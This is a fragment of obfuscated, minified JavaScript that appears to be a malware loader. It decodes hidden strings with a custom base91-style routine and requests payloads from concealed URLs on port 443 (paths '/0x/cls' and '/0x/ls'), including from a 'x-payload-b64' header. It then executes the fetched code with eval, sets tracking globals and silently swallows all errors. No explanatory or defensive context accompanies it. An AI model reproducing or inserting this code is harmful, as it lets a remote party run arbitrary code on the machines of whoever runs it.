f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
